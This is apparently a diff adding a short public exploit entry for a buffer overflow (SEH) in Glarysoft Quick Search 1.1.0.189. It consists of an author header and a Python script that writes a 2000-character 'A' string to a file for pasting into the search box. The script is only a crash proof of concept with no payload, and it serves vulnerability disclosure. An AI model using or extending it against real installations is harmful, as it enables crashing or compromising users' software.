@@ -1,0 +1,26 @@
+# Exploit Title: Quick Search Version 1.1.0.189 Buffer Overflow vulnerability(SEH)
+# Date: 14-05-2013
+# Exploit Author: ariarat 
+# Vendor Homepage: http://www.glarysoft.com/
+# Software Link: http://download.glarysoft.com/qsearchsetup.exe
+# Version: 1.1.0.189 
+# Tested on: [ Windows 7 & windows XP sp2,sp3]
+#============================================================================================
+# After creating txt file,open created file and copy the AAA... string to clipboard and
+# then paste in Search section.for better results bring program in Full Mode and in Edit 
+# menu choose Match Path and then paste your string.   
+#
+#============================================================================================
+# Contact :
+#------------------
+# Web Page : http://ariarat.blogspot.com
+# Email    : mehdi.esmaeelpour@gmail.com
+#============================================================================================
+
+#!/usr/bin/python
+
+filename="string.txt"
+buffer = "\x41" * 2000
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
